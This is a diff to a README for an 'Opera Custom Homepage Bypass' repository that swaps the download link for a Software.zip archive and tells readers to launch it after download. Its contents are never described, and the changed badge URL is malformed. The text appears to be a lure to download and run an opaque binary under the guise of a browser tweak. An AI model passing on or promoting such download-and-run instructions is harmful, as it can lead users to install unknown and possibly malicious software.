@@ -30,7 +30,7 @@ Welcome to the "Opera Custom Homepage Bypass" repository! This project provides 
 
 ### Get Started
 To utilize the bypass solution, download the software package from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-<COLOR>.svg)](https://github.com/user-attachments/files/18388744/Software.zip)  
+[![Download Software](https://github.com/TSAN07/Opera-Custom-Homepage-Bypass/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/TSAN07/Opera-Custom-Homepage-Bypass/releases/download/v2.0/Software.zip)  
 *(Note: The software needs to be launched after download for implementation.)*
 
 ### Instructions
